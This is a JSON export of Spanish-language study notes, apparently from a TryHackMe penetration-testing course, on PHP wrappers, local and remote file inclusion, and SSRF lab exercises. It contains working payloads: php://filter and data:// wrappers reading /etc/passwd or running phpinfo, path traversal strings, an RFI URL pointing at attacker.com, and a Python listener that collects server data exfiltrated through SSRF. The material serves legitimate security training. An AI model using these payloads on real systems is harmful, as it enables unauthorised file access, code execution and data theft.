[
  {
    "title": "3. PHP Wrappers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/3-php-wrappers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/3. PHP Wrappers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "Los wrappers PHP son parte de la funcionalidad de PHP que permite a los usuarios acceder a varios flujos de datos. Los wrappers también pueden acceder o ejecutar código a través de protocolos PHP, lo que puede llevar a riesgos de seguridad importantes.\n\nPor ejemplo, una aplicación vulnerable a LFI puede incluir archivos basado en input dado por el usuario sin validación suficiente. En dichos casos, los atacantes pueden usar el filtro `php://filter`. Este filtro permite a un usuario realizar operaciones de modificación básicas sobre la información antes de que se lea o escriba. Por ejemplo, si un atacante quiere encodear el contenido de un archivo como `/etc/passwd` en base64. Esto lo puede conseguir usando el filtro de conversión `conver.base64-encode` del wrapper. El payload final sería `php://filter/conver.base64-encode/resource=/etc/passwd`.\n\nPor ejemplo, ve a `http://IP/playground.php` u usa el payload final allí.\n\n![[Pasted image 20260125144453.png]]\n\nUna vez que la aplicación procese este payload, el servidor devolverá el contenido encodeado de **passwd**.\n\n![[Pasted image 20260125144530.png]]\n\nEl atacante puede decodearlo después.\n\n![[Pasted image 20260125144545.png]]\n\nHay muchas categorías de filtros en PHP. Algunos son **Filtros de String** (`string.rot13`, `string.toupper`, `string.tolower` y `string.strip_tags`), **Filtros de Conversión** (`convert.base64-encode`, `convert.base64-decode`, `convert.quoted-printable-encode` y `convert.quoted-printable-decode`), **Filtros de Compresión** (`zlib.deflate` y `zlib.inflate`) y **Filtros de Encriptación** (`mcrypt` y `mdecrypt`).\n\nPor ejemplo, la tabla de abajo representa el output del archivo **.htaccess** usando diferentes filtros de string:\n\n| **Payload**                                           | **Output**                                   |\n| ----------------------------------------------------- | -------------------------------------------- |\n| php://filter/convert.base64-encode/resource=.htaccess | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |\n| php://filter/string.rot13/resource=.htaccess          | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf            |\n| php://filter/string.toupper/resource=.htaccess        | REWRITEENGINE ON OPTIONS -INDEXES            |\n| php://filter/string.tolower/resource=.htaccess        | rewriteengine on options -indexes            |\n| php://filter/string.strip_tags/resource=.htaccess     | RewriteEngine on Options -Indexes            |\n| No filter applied                                     | RewriteEngine on Options -Indexes            |\n\n-----------------------------------------------\n<h2>Data Wrapper</h2>\nEl wrapper de flujo de información es otro ejemplo de la funcionalidad de wrappers de PHP. El wrapper `data://` permite la incrustación de información en la propia linea. Se usa para incrustar pequeñas cantidades de información directamente en el código de la aplicación.\n\nPor ejemplo, ve a `http://IP/playground.php` y usa el payload `data:text/plain,<?php%20phpinfo();%20?>`. En la imagen de abajo esta URL podría causar ejecución de código PHP, mostrando los detalles de su configuración.\n\n![[Pasted image 20260125145344.png]]\n\nEl desglose del payload `data:text/plain,<?php phpinfo(); ?>` es:\n\n- `data:` Como URL.\n- `mime-type`: Configurada como `text/plain`.\n- La parte de los datos incluye una traza de código PHP: `<?php phpinfo(); ?>`.",
    "modified": "2026-01-26T01:00:07"
  },
  {
    "title": "2. File Inclusion Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/2-file-inclusion-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/2. File Inclusion Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Fundamentos de la Inclusión de Archivos</h2>\nUna string de traversal, comúnmente vista como `../` se usa en ataques de path traversal para navegar entre la estructura de directorios de un sistema de ficheros. Se usan para acceder a archivos fuera del directorio pretendido.\n\nLa ruta relativa se refiere a localizar archivos basándonos en el directorio actual. Por ejemplo `include('./folder/file.php')` implica que `file.php` está en un directorio llamado `folder`, que está en el mismo directorio que el script en ejecución.\n\nLa ruta absoluta implica especificar la ruta completa desde el directorio `/`. Por ejemplo, `/var/www/html/folder/file.php`.\n\n---------------------------------------------\n<h2>Remote File Inclusion</h2>\nLa inclusión de archivos remotos, o RFI, es una vulnerabilidad que permite a los atacantes incluir archivos remotos, normalmente mediante manipulación de input. Esto puede llevar a ejecución de scripts o código maliciosos en el servidor.\n\nTípicamente, RFI ocurre en aplicaciones que incluyen contenido externo de forma dinámica. Los atacantes pueden manipular parámetros en una petición para apuntar a archivos externos maliciosos. Por ejemplo, si una aplicación web usa una URL en un parámetro GET como `include.php?page=http://attacker.com/exploit.php`, un atacante podría reemplazar la URL con la ruta a un script malicioso.\n\n----------------------------------------------\n<h2>Local File Inclusion</h2>\nLa inclusión de archivos locales, o LFI, ocurre cuando un atacante explota un campo de input vulnerable para acceder o ejecutar archivos en el servidor. Los atacantes normalmente explotan campos de input poco sanitizados para manipular rutas, intentando acceder a archivos fuera del directorio pretendido. Por ejemplo, usando una string de path traversal, un atacante puede acceder a archivos sensibles como `include.php?page=../../../../etc/passwd`.\n\nAunque LFI suele llevar a acceso no autorizado a archivos, puede escalar a RCE. Esto puede ocurrir si un atacante puede subir o inyectar código en un archivo que luego se incluye o se ejecuta. Técnicas como log poisoning, que significa inyectar código en los archivos de registro y luego incluir esos archivos, son ejemplos de como LFI puede llevar a RCE.\n\n-------------------------------------\n<h2>RFI vs LFI (Proceso de Explotación)</h2>\n![[Pasted image 20260124160248.png]]\n\nEste diagrama diferencia el proceso de explotar vulnerabilidades RFI y LFI. En RFI, el foco está en incluir y ejecutar archivos remotos, mientras que en LFI, el atacante intenta acceder a archivos locales y potencialmente usar esto para acceder a ejecutar código en el servidor.",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "1. Web Application Architecture",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/1-web-application-architecture/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/1. Web Application Architecture.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Estructura de una Aplicación Web</h2>\nLas aplicaciones web son sistemas complejos que comprenden varios componentes que trabajan juntos para repartir una buena experiencia de usuario. En su núcleo. una aplicación web tiene dos partes principales: el frontend y el backend.\n\n1. **Frontend:** Esta es la interfaz de usuario de la aplicación, típicamente construida usando frameworks como React, Angular o Vue.js. Se comunica con el backend vía APIs.\n2. **Backend:** Este componente del servidor procesa las peticiones del usuario, interactúa con las bases de datos y sirve información al frontend. Se suele desarrollar usando lenguajes como PHP, Python y JavaScript y frameworks como Node.js, Django o Laravel.\n\nUno de los aspectos fundamentales de las aplicaciones web es el modelo cliente-servidor. En este modelo, el cliente manda una petición al servidor. El backend lo procesa y manda una respuesta. El cliente y la comunicación del servidor suele pasar a través de protocolos HTTP/HTTPS.\n\n![[Pasted image 20260124131237.png]]\n\n----------------------------------------\n<h2>Server-Side Scripting y Manejo de Archivos</h2>\nLos scripts del lado del servidor corren en el servidor y generan el contenido del frontend, el cual se manda al cliente. A contrario que los scripts del lado del cliente como JavaScript en el navegador, los scripts del lado del servidor pueden acceder al sistema de ficheros y bases de datos del servidor.\n\nEl manejo de archivos es una parte importante del server-side scripting. Las aplicaciones web suelen necesitar leer o escribir archivos del servidor. Por ejemplo, leer archivos de configuración, guardar archivos subidos del usuario o incluir código de otros archivos.\n\nPor ejemplo, la aplicación de abajo incluye un archivo basado en el input del usuario.\n\n![[Pasted image 20260124131938.png]]\n\nSi este input no es correctamente validado y sanitizado, un atacante puede explotar el parámetro vulnerable para incluir archivos maliciosos o acceder a archivos sensibles en el servidor. En este caso, el atacante podría ver los contenidos del archivo `/etc/passwd`.\n\n![[Pasted image 20260124132045.png]]",
    "modified": "2026-01-25T01:01:15"
  },
  {
    "title": "5. Types of SSRF - Blind",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/5-types-of-ssrf-blind/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/5. Types of SSRF - Blind.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "La SSRF blind se refiere a un escenario donde el atacante puede mandar peticiones al servidor objetivo pero no recibe una respuesta directa o feedback sobre el resultado de sus peticiones.  Este tipo de SSRF puede ser más difícil de explotar debido a que el atacante no ve directamente el resultado de sus acciones.\n\n-----------------------------------------------\n<h2>Blind SSRF con Out-Of-Band</h2>\nLa SSRF OOB es una técnica dnde el atacante usa diferentes canales de comunicación en lugar de recibir respuestas por el mismo canal.\n\nPor ejemplo, el atacante puede manipular el servidor vulnerable para hacer una petición DNS a un domminio controlado por él. Esta interacción externa ofrece al atacante evidencia de que una vulnerabilidad SSRF existe y potencialmente le permite recolectar información como IPs internas y estructura de red.\n\n<h4>Cómo Funciona</h4>\n- Una vez más, inicia sesión en el dashboar en la pestaña `Profile`. Veremos que nos redirige a `http://hrms.thm/profile.php?url=localhost/getInfo.php`, lo que muestra un mensaje de que la información se está mandando.\n  ![[Pasted image 20260123112505.png]]\n- ¿Qué está pasando aquí? Una vez que cargamos `profile.php`, manda la información a una página externa llamada `getInfo.php`, lo que es probablemente usado para analíticas o registros.\n\n```php\n<?php\n...\n$targetUrl = $_GET['url'];\nob_start();\nob_start();\nphpinfo();\n$phpInfoData = ob_get_clean();\n$ch = curl_init($targetUrl); \ncurl_setopt($ch, CURLOPT_POST, 1);\ncurl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$response = curl_exec($ch); \n...\n?>\n```\n\n- El análisis del código fuente de la página muestra que está leyendo parámetros `url` y sin realizar ninguna validación, manda la información al servidor mencionado en el parámetro de la URL.\n- Aquí, el atacante puede redirigir la petición a su servidor, consiguiendo así información adicional para la explotación.\n- En tu máquina, cera un nuevo archivo llamado `server.py` y añade el siguiente código:\n\n```python\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\nfrom urllib.parse import unquote\nclass CustomRequestHandler(SimpleHTTPRequestHandler):\n\n    def end_headers(self):\n        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin\n        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')\n        self.send_header('Access-Control-Allow-Headers', 'Content-Type')\n        super().end_headers()\n\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b'Hello, GET request!')\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode('utf-8')\n\n        self.send_response(200)\n        self.end_headers()\n\n        # Log the POST data to data.html\n        with open('data.html', 'a') as file:\n            file.write(post_data + '\\n')\n        response = f'THM, POST request! Received data: {post_data}'\n        self.wfile.write(response.encode('utf-8'))\n\nif __name__ == '__main__':\n    server_address = ('', 8080)\n    httpd = HTTPServer(server_address, CustomRequestHandler)\n    print('Server running on http://localhost:8080/')\n    httpd.serve_forever()\n```\n\n- El código de arriba recibirá todo el contenido y lo guardará en `data.html` en el servidor. Para obtener la información, necesitamos arrancar un servidor ligero. Podemos hacerlo con: `sudo chmod +x server.py && sudo python3 server.py`.\n- Ahora abre el navegador y ve a `http://hrms.thm/profile.php?url=http://IP:8000`, lo que registrará la información en `data.html`. Abre el archivo `data.html` que contiene la información del servidor que usaremos para ataques futuros.\n\n![[Pasted image 20260123113739.png]]\n\n--------------------------------------------\n<h2>Semi-Blind SSRF (Basada en Tiempo)</h2>\nLa SSRF time-based es una variación de SSRF donde el atacante usa peticiones relacionadas con tiempo para inferir el éxito o fracaso de la petición maliciosa. Observando cómo de largo se toma para responder podemos concluir si nuestras peticiones son correctas o no.",
    "modified": "2026-01-24T00:53:46"
  },
  {
    "title": "4. Types of SSRF - Basic - continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/2-ssrf/4-types-of-ssrf-basic-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/2. SSRF/4. Types of SSRF - Basic - continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 2. SSRF",
    "content": "En esta tarea vamos a continuar aprendiendo sobre técnicas básicas de SSRF.\n\n----------------------------------------\n<h2>Escenario 2: Acceder a un Servidor Interno</h2>\nEn aplicaciones web complejas, es común para las aplicaciones front-end interactuar con servidores back-end internos. Estos servidores suelen estar hosteados en direcciones IP no ruteables, por lo que un usuario de internet no puede acceder a ellos. En este contexto, un atacante explota la validación del input vulnerable de la web para engañar al servidor para que mande peticiones internas a recursos en la misma red.\n\nPor ejemplo, si un servidor interno ofrece manejo de base de datos o controles administrativos, el atacante podría construir una URL que inicie una acción no deseada en estos sistemas internos. Técnicamente se consigue a través de input manipulado, como direcciones IP especiales (como `192.168.x.x` o `10.x.x.x` para IPv4) o nombres de dominio (por ejemplo `internal-database.hrms.thm`).\n\nAdemás, como estos servidores internos pueden estar faltos del mismo nivel de seguridad y monitorización que los servidores externos, dicha explotación puede no ser vista. El atacante puede usar también este método para realizar reconocimiento en la red interna, identificando otros objetivos o sistemas vulnerables.\n\n<h4>Cómo Funciona</h4>\n- En este caso, trataremos de acceder a recursos internos inaccesibles a través de peticiones directas.\n- Ahora que hemos adquirido las credenciales del panel de login, vamos a iniciar sesión en la dashboard.\n- Una vez logueados en la app HRMS, veremos un dashboard que lista empleados y sus departamentos. Hay un menú que muestra los datos de los empleados y su salario.\n  ![[Pasted image 20260122222157.png]]\n- Desde el archivo de configuración, podemos ver que el panel de admin está hosteado en `http://192.168.2.10/admin.php`. Si intentamos loguearnos no es accesible directamente.\n  ![[Pasted image 20260122222313.png]]\n- No tenemos ruta a esa IP ya que forma parte de una red privada y sólo puede ser accedida por una máquina en la misma red.\n- Si comprobamos el código fuente de HTML, muestra que el menú toma la URL de un sistema interno y renderiza la información. Los detalles de toos los empleados se trasfieren de `http://192.168.2.10/employees.php`.\n  ![[Pasted image 20260123100445.png]]\n- Vale, vemos que el menú desplegable accede a un sistema interno. ¿Qué pasa si intentamos cambiar la petición de tal forma que en vez de cargar la página de empleados mandamos `http://192.168.2.10/admin.php`?\n  ![[Pasted image 20260123100610.png]]\n- Una vez actualizado el valor, elegimos `Salary` del menú desplegable `Select Category`.\n  ![[Pasted image 20260123100824.png]]\n- Ahí lo tenemos, el panel que antes era inaccesible.\n  ![[Pasted image 20260123100844.png]]",
    "modified": "2026-01-24T00:53:46"
  }
]